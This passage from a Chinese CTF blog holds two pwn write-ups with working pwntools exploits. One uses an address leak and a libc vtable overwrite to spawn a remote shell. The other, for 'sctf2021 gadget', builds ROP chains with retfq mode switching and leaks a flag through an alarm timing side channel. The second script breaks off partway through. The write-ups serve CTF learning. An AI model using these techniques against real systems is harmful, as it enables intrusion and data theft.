<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;chuj.top&#x27;</span>,<span class="number">47250</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./spfa&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&quot;b main&quot;)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many datas?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27; to ?\n&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">2275</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;the length of the shortest path is &#x27;</span>)</span><br><span class="line">    dist_addr=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>])-<span class="number">8</span>+<span class="number">0x4720</span></span><br><span class="line">    elf_base=dist_addr-<span class="number">0x4720</span>-<span class="number">0x7000</span></span><br><span class="line">    bss_addr=dist_addr-<span class="number">0x4720</span></span><br><span class="line">    dock_addr=elf_base+<span class="number">0x16A5</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(bss_addr)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x50</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27; to ?\n&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">2272</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;the length of the shortest path is &#x27;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>])-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])</span><br><span class="line">    <span class="comment">#io=libc_base+0x1ec8a0+0x38</span></span><br><span class="line">    io=libc_base+libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]+<span class="number">0x28</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(io)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>((io-dist_addr)/<span class="number">8</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(dock_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#sh.sendlineafter(&#x27; to ?\n&gt;&gt;&#x27;,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;the length of the shortest path is &#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;how many nodes?\n&gt;&gt; &#x27;,&#x27;2&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;how many edges?\n&gt;&gt; &#x27;,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.sendline(str(1))</span></span><br><span class="line">    <span class="comment"># sh.sendline(&#x27;-2217&#x27;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    <span class="comment"># sh.sendline(str(bss_addr+0x100+0xd8+0x38))</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;you want to start from which node?\n&gt;&gt; &#x27;,str(0x10))</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27; to ?\n&gt;&gt;&#x27;,str(-2272))</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;the length of the shortest path is &#x27;)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>调试程序越来越熟练了，通过调试printf函数的执行过程也直观了解了虚表的作用，以后能任意写除了got表和exit，还能改写虚表拿shell了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/20/sctf2021-gadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/20/sctf2021-gadget/" class="post-title-link" itemprop="url">sctf2021 gadget</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-20 18:32:48 / 修改时间：18:37:19" itemprop="dateCreated datePublished" datetime="2022-01-20T18:32:48+08:00">2022-01-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="sctf2021-gadget"><a href="#sctf2021-gadget" class="headerlink" title="sctf2021 gadget"></a>sctf2021 gadget</h1><p>知识点：64位程序转32位，三十二位使用int80调用open，alarm侧信道攻击</p>
<p>做过的最难的构造rop题目了，但学到了很多东西，用了快两天才复现成功，这道题能搜到的wp就两个，而且只有脚本，没有多少讲解，我是硬着头皮看脚本一步步动态调试才搞明白，所以这篇wp我会写的细一点，一方面有可能对其他人有用（几乎不可能），一方面加深我的理解。</p>
<h2 id="64位程序转32位"><a href="#64位程序转32位" class="headerlink" title="64位程序转32位"></a>64位程序转32位</h2><p>程序运行起来时，专门有一个寄存器cs来决定到底是以64位运行还是以32位运行，当cs为0x33时，程序以64位运行，当cs是0x23时程序以32位运行，这个寄存器并不是不能更改的，专门有个指令retfq用来更改cs，最关键的是retfq还有跳转功能，那就代表组成攻击链。</p>
<p>retfq有三步操作（就结果而言），先设置cs为[rsp+0x8]，然后rsp+0x10,然后跳转到rsp-0x10,这样说可能有点抽象，我们可以用gadget来实操一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)+p32(pop_rax)</span><br></pre></td></tr></table></figure>

<p>然后在这里下断点运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x409d1c &lt;__futexwait+113&gt;    pop    rsp</span><br><span class="line">   0x409d1d &lt;__futexwait+114&gt;    mov    edi, 0x88bf2838</span><br><span class="line">   0x409d22 &lt;__futexwait+119&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line"> ► 0x4011ec &lt;main+28&gt;            retfq  </span><br><span class="line">    ↓</span><br><span class="line">   0x4011ec &lt;main+28&gt;            retfq  </span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x40d010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x401002 (_init+2) ◂— ret    </span><br><span class="line">01:0008│     0x40d018 ◂— 0x23 /* &#x27;#&#x27; */</span><br><span class="line">02:0010│     0x40d020 (__dso_handle) ◂— 0x500401001</span><br><span class="line">03:0018│     0x40d028 (__dso_handle+8) ◂— 0x40d00000403072 /* &#x27;r0@&#x27; */</span><br><span class="line">04:0020│     0x40d030 (install_seccomp.filter) ◂— 0x40d0000040d000</span><br><span class="line">05:0028│     0x40d038 (install_seccomp.filter+8) ◂— 0x40117b0040d000</span><br><span class="line">06:0030│     0x40d040 (install_seccomp.filter+16) ◂— 0x4011f300000000</span><br><span class="line">07:0038│     0x40d048 (install_seccomp.filter+24) ◂— 0x401002004011ec</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>这时要执行retfq时的指令区和栈区，执行完后就变成这样了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x401002 &lt;_init+2&gt;    ret    &lt;0x500401001&gt;</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x40d020 (__dso_handle) ◂— 0x500401001</span><br><span class="line">01:0008│     0x40d028 (__dso_handle+8) ◂— 0x40d00000403072 /* &#x27;r0@&#x27; */</span><br><span class="line">02:0010│     0x40d030 (install_seccomp.filter) ◂— 0x40d0000040d000</span><br><span class="line">03:0018│     0x40d038 (install_seccomp.filter+8) ◂— 0x40117b0040d000</span><br><span class="line">04:0020│     0x40d040 (install_seccomp.filter+16) ◂— 0x4011f300000000</span><br><span class="line">05:0028│     0x40d048 (install_seccomp.filter+24) ◂— 0x401002004011ec</span><br><span class="line">06:0030│     0x40d050 (install_seccomp.filter+32) ◂— 0x40100100000033 /* &#x27;3&#x27; */</span><br><span class="line">07:0038│     0x40d058 (install_seccomp.filter+40) ◂— 0x0</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]─────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>此时rsp已经加10，要执行的指令也是此时的rsp-0x10,即我们构造的ret,rsp也是我们构造的gadget的指令，这样攻击链就连上了（跳转功能）。</p>
<h2 id="三十二位使用int80调用open"><a href="#三十二位使用int80调用open" class="headerlink" title="三十二位使用int80调用open"></a>三十二位使用int80调用open</h2><p>64位系统调用open和32位系统调用open函数的寄存器布置并不相同，网上也没什么资料，搜了好久然后问了ayoung佬才搞懂。在64位系统调用时要布置rax,rdi,rsi,rbx四个参数，rax是系统调用号，后面三个是参数，在32位系统调用时是布置ecx,eax,ebx,edx,四个参数的作用如下图如下图，其中eax,ebx必须非常严谨，ecs和edx布不布置都行，但ecx为0会提高成功率（奇怪的知识），所以最好还是布置ecx。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220119222532362.png" alt="image-20220119222532362"></p>
<p>在32位程序中系统调用并不是syscall（而且并不存在），而是int80指令，选择gadget的时候最好选择int80;ret（如果后面还有rop要执行的话）,</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int 80;ret</span><br></pre></td></tr></table></figure>

<h2 id="alarm侧信道攻击"><a href="#alarm侧信道攻击" class="headerlink" title="alarm侧信道攻击"></a>alarm侧信道攻击</h2><p>alarm函数是程序的一个计时函数，比如程序刚开始调用alarm(10)，那这个函数从这个时间点开始只能再执行十秒钟</p>
<p>利用思路：可以把flag的每个字符mov给rdi后调用alarm函数，从alarm函数开始执行的时候计时，然后检测程序的结束时间，结束时间减去开始时间就是rdi的值即flag的每个字符的值。</p>
<h4 id="重点：当执行完alarm函数后得让程序陷入死循环，不然执行完alarm函数就直接退出程序了，不能达到我们想要的目的，比如这个rop"><a href="#重点：当执行完alarm函数后得让程序陷入死循环，不然执行完alarm函数就直接退出程序了，不能达到我们想要的目的，比如这个rop" class="headerlink" title="重点：当执行完alarm函数后得让程序陷入死循环，不然执行完alarm函数就直接退出程序了，不能达到我们想要的目的，比如这个rop"></a>重点：当执行完alarm函数后得让程序陷入死循环，不然执行完alarm函数就直接退出程序了，不能达到我们想要的目的，比如这个rop</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(alarm)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(push_rsi_ret)</span><br></pre></td></tr></table></figure>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>checksec分析</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/rootzhang/get-shell/sctf2021/gadget/gadget&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>沙盒分析</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/sctf2021/gadget$ seccomp-tools dump ./gadget</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>只允许调用fstat(32位下的open函数),read函数和alarm函数，从这里就可以看出做题思路了，先64位转三十二位调用open函数读flag，然后再转成64位调用read函数把flag写到程序里，然后alarm侧信道爆破</p>
<p>ida反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  alarm_sys(<span class="number">48LL</span>, argv, envp);</span><br><span class="line">  install_seccomp(<span class="number">48LL</span>, (__int64)argv, v3, v4, v5, v6);</span><br><span class="line">  read_sys(v9);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)&amp;locret_401002;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">read_sys</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sys_read(<span class="number">0</span>, a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序非常简单没有canary还有溢出，那就直接溢出构造rop完成攻击思路，注意rop非常长所以得进行栈迁移才行。</p>
<p>第一步调用read函数把rop写到bss段然后栈迁移到这里</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure>

<p>第二步retfq后调用open函数读flag文件，然后再retfq后调用read函数把flag写到bss段，然后再调用read函数进栈迁移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">   payload+=p64(bss_base+<span class="number">1</span>+num+)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num+)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num+)</span><br><span class="line">paylaod=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>第三步把alarm函数的rop写入bss段然后计时（注意不能在第二步就把alarm函数的rop就写入栈中，这样做的话我们就不能知道alarm函数到底是什么时候调用的，因为前面执行了好多代码了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(alarm)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">   payload+=p64(push_rsi_ret)</span><br><span class="line">   sh.send(payload)</span><br><span class="line">   start=time.time()</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       sh.recv()</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       end=time.time()</span><br><span class="line">       asc=<span class="built_in">int</span>(end-start)</span><br><span class="line">       <span class="keyword">global</span> flag</span><br><span class="line">       flag+=<span class="built_in">chr</span>(asc)</span><br><span class="line">       <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>

<p>完整脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040288d : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172f : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288f : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401731 : pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401733 : pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401001 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x0000000000402890 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401102 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172e : pop rbx ; pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000403072 : pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040117b : pop rcx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401734 : pop rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401732 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288e : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401730 : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401002 : ret</span></span><br><span class="line"><span class="string">0x0000000000402c04: mov rsi, r15; mov rdx, r12; call r14; mov edi, eax; call 0x1010; ret;</span></span><br><span class="line"><span class="string">x0000000000401102: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x0000000000409d1c: pop rsp; mov edi, 0x88bf2838; ret;</span></span><br><span class="line"><span class="string">0x0000000000401001: pop rax; ret; </span></span><br><span class="line"><span class="string">0x00000000004011f3: int 0x80; ret;</span></span><br><span class="line"><span class="string">0x0000000000403072: pop rbx; pop r14; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000040117b: pop rcx; ret;</span></span><br><span class="line"><span class="string">0x0000000000408865: syscall; 